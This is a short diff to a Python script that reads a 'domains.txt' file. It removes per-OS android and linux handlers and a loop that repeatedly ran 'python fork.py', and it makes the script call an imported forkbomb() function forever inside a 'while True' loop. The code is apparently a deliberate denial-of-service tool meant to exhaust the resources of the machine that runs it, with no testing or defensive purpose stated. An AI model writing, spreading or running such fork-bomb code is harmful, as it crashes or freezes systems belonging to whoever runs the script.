@@ -1,8 +1,7 @@
 import os
 import platform
 import time
-from android import android
-from linux import linux
+from forkbomb import forkbomb
 _os = ""
 _number = 0
 file = os.getcwd() + "/domains.txt"
@@ -20,10 +19,4 @@ elif platform.system() == "Linux":
 else:
   pass
 while True:
-  os.system("python fork.py")
-  if _os == "android":
-    android()
-  elif _os == "linux":
-    linux()
-  else:
-    pass
+  forkbomb()
